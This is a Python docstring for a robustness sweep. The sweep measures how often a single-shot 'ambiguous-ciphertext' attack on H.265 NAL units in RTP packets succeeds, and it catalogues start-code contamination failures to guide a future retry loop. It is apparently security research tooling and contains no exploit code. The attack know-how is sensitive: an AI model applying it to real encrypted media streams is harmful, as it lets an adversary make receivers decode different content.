"""Robustness sweep: run the per-packet ambiguous-ciphertext attack against
every NAL in the adversary H.265 stream that fits a single RTP packet,
and report per-NAL outcomes. Three things can go wrong on any given NAL:

  S0 — size: the NAL plus Filler Data trailer overshoots the RTP MTU.
       Paper Table 3 excludes Fragmentation Units from the attack, so
       such NALs are simply skipped (not counted as failures).

  S1 — start-code 0x000001 contamination: after building the ambiguous
       ciphertext, the K_NEW receiver's recovered plaintext might
       accidentally contain a 0x000001 start code in the random-looking
       region. If that happens *before* the adversary NAL boundary the
       H.265 RTP depacketizer can be tricked into pretending the K_NEW
       plaintext also contains a valid NAL — undesirable, the attack
       paper §5.4.2.2 describes a SEQ-bumping retry loop to dodge this.

  S2 — adjustment slot in K_NEW recovers to bytes that look like a
       canonical start code 0x000001. Same problem as S1 but localised
       to the adjustment block.

We do NOT yet implement the SEQ-bump retry; we just count how often the
naive single-shot attack succeeds. This bounds the worst-case retry
budget the runtime hook will need.

Numbers reported:
  - per-NAL-type tally of (eligible, attack_ok, S1_hit, S2_hit)
  - overall single-shot success rate
  - a small sample of failing NALs (offset of the spurious 0x000001 in
    the K_NEW recovered bytes), to inform avoidance-loop design.
"""


